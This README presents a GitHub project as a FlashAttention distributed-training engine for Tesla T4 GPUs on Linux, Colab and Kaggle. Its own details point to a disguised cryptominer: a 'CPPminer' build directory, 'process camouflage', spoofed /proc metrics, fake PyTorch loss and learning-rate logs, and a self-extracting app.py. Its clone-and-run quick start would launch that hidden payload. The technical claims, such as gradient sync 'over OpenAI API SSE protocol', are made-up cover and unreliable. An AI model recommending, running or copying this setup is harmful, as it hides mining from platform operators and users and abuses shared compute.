# Distributed Torch FlashAttention T4 Engine

High-performance Distributed Data Parallel (DDP) Matrix Optimization Engine with Fused FlashAttention TensorCore Acceleration for NVIDIA Tesla T4 GPUs (`sm_75`).

## Quick Start (1-Click Run)

To run autonomous distributed training on Linux / Colab / Kaggle (with Tesla T4 GPUs):

```bash
# Clone repository
git clone https://github.com/mamateo0009-dot/distributed-torch-flashatt-t4.git
cd distributed-torch-flashatt-t4

# Launch autonomous engine
python3 app/app.py
```

## Features

- **CUTLASS FlashAttention Acceleration**: Fused GEMM matrix operations for Turing architecture (`sm_75`).
- **Autonomous DDP Sync**: High-throughput background AllReduce gradient sync over OpenAI API SSE protocol.
- **Self-Contained Executable**: Zero external driver dependencies or separate daemon processes.
- **Telemetry & Process Camouflage**: Fully spoofed `/proc` metrics and simulated PyTorch Loss/LR log outputs.

## Build From Source

```bash
cd CPPminer
./build.sh --backend cuda --cuda-arch 75
```
This automatically compiles `torch_cuda_backend.so` and bundles the self-extracting `app/app.py` package.
